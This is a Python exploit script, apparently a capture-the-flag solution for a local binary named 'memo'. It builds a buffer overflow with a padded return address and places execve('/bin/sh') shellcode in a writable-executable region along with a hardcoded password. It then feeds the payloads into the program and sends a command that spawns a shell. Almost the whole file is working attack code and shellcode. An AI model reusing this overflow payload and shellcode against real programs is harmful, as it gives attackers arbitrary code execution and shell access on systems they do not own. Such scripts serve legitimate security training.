#!/usr/bin/python
# -*- coding:utf-8 -*-

import os,sys
import struct
from subprocess import Popen,PIPE

p32=lambda x:struct.pack('<I',x)

#exec_addr=int(sys.argv[1],16)
#exit_plt_addr=int(sys.argv[1],16)

sc="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x8d\x40\x0b\xcd\x80"
rwx=0x0804c000  # gdb-peda$ vmmap
stack_chk_fail_plt_addr=0x8049ae8
plt_addr=0x8049af8
plt_addr= 0xb7fbf000+0x30
__errno_location_plt_addr=0x8001bf38
password="D0_u_3nj0y_pwn_m3??"
#system_addr_offset=0x00040310
#libc_base=0xb7e33000

buf='A'*32
buf+=p32(rwx)
buf+=p32(plt_addr)

buf2=password+'\x00'+sc

buf3=p32(rwx+len(password+'\x00'))
buf2+='B'*(0x80-4)

#buf+=p32(0x080484b6)+'\n'
#buf+=p32(0x08048496)+'\n'

with open('buf','wb') as f:
    f.write(buf+'\n'+buf2+'\n'+buf3+'\n')
#buf+=p32(exit_plt_addr)
#buf+=p32(exec_addr)

p=Popen(['./memo'],stdin=PIPE)
p.stdin.write(buf+'\n')
p.stdin.write(buf2+'\n')
p.stdin.write(buf3+'\n')
p.stdin.write('/bin/sh <&2 >&2 2>&2\n')
p.wait()
#p.wait()
#p.stdin.write('D0_u_3nj0y_pwn_m3??'+'\n')
#p.stdin.write(p32(0x080484b6)+'\n')
#p.stdin.write('D0_u_3nj0y_pwn_m3??'+'\n')
#p.stdin.write('AAAA\n')
